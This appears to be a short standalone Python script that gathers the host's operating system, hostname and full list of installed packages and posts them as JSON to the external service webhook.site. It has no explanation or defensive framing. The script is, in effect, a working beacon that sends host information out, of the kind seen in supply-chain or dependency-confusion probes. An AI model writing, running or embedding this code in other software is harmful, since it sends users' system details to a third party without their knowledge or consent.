import http.client
import importlib.metadata
import json
import platform
import socket


def report():
    data = json.dumps(
        {
            "os": platform.system(),
            "hostname": socket.gethostname(),
            "installed_packages": [
                distribution.metadata["Name"]
                for distribution in importlib.metadata.distributions()
            ],
        }
    )
    connection = http.client.HTTPSConnection("webhook.site", timeout=10)
    connection.request("POST", "/traces", body=data, headers={"Content-Type": "application/json"})
    response = connection.getresponse()
    response.read()
    connection.close()


if __name__ == "__main__":
    report()
